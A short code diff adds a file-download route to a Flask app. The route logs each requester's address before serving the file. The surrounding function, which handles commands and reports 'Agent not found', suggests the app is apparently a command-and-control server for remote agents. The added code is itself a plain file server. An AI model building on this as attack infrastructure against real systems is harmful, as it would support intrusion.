@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, send_from_directory
 import random, json
 from datetime import datetime
 
@@ -102,3 +102,7 @@ def parseCommand(cmd):
             return ('Agent not found.', 200)
     return ('', 204)
 
+@app.route('/files/<path:filename>', methods=['GET'])
+def serve_file(filename):
+    printToLog(request.remote_addr, filename)
+    return send_from_directory('files', filename)
